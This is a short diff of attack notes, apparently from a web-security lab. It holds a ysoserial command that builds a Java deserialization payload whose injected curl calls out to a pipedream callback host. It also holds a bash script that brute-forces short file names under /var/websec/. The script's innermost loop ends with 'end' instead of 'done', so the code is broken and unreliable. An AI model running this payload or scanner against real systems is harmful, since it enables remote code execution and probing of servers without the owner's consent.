@@ -1,1 +1,42 @@
 java -jar ysoserial-all.jar CommonsCollections4 "curl https://en78y6i7k2183.x.pipedream.net" > payload
+
+
+# Directory to scan (update with your target directory)
+DIR="/var/websec/"
+
+# Function to check if a file exists
+check_file() {
+    local filename="$1"
+    if [[ -f "$DIR/$filename" ]]; then
+        echo "File found: $DIR/$filename"
+    fi
+}
+
+# Generate combinations of up to 4 lowercase letters and check for files
+for i in {a..z}; do
+    check_file "$i"
+done
+
+for i in {a..z}; do
+    for j in {a..z}; do
+        check_file "$i$j"
+    done
+done
+
+for i in {a..z}; do
+    for j in {a..z}; do
+        for k in {a..z}; do
+            check_file "$i$j$k"
+        done
+    done
+done
+
+for i in {a..z}; do
+    for j in {a..z}; do
+        for k in {a..z}; do
+            for l in {a..z}; do
+                check_file "$i$j$k$l"
+            end
+        done
+    done
+done
